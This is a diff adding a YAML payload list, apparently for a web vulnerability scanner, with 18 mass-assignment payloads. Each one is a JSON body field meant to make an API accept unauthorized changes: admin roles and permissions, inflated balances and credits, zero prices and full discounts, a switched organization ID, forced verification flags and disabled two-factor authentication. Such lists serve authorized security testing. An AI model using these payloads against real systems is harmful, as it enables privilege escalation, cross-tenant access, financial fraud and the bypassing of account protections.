@@ -1,0 +1,149 @@
+defaults:
+  vuln_type: mass_assignment
+  encoding: raw
+  source: ensphere
+
+payloads:
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"role": "admin"}'
+    notes: "Inject admin role field"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"is_admin": true}'
+    notes: "Inject is_admin boolean field"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"admin": true}'
+    notes: "Inject admin boolean field"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"verified": true}'
+    notes: "Inject verified status field"
+    tags: [mass_assignment, status_manipulation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"approved": true}'
+    notes: "Inject approved status field"
+    tags: [mass_assignment, status_manipulation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"balance": 999999}'
+    notes: "Inject balance field"
+    tags: [mass_assignment, financial]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"price": 0}'
+    notes: "Inject zero price field"
+    tags: [mass_assignment, financial]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"credits": 999999}'
+    notes: "Inject credits field"
+    tags: [mass_assignment, financial]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"permissions": ["admin", "write", "delete"]}'
+    notes: "Inject permissions array"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"group_id": "admin-group"}'
+    notes: "Inject admin group ID"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"organization_id": "target-org"}'
+    notes: "Inject target organization ID"
+    tags: [mass_assignment, tenant_manipulation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"discount": 100}'
+    notes: "Inject 100% discount"
+    tags: [mass_assignment, financial]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"tier": "enterprise"}'
+    notes: "Inject enterprise tier"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"plan": "unlimited"}'
+    notes: "Inject unlimited plan"
+    tags: [mass_assignment, privilege_escalation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"active": true}'
+    notes: "Inject active status"
+    tags: [mass_assignment, status_manipulation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"email_verified": true}'
+    notes: "Inject email verified status"
+    tags: [mass_assignment, status_manipulation]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"two_factor_enabled": false}'
+    notes: "Disable two-factor authentication"
+    tags: [mass_assignment, security_bypass]
+
+  - technique: mass_assignment
+    injection_surface: json_body
+    evidence_type: response_diff
+    risk: 3
+    payload: '{"account_type": "premium"}'
+    notes: "Inject premium account type"
+    tags: [mass_assignment, privilege_escalation]
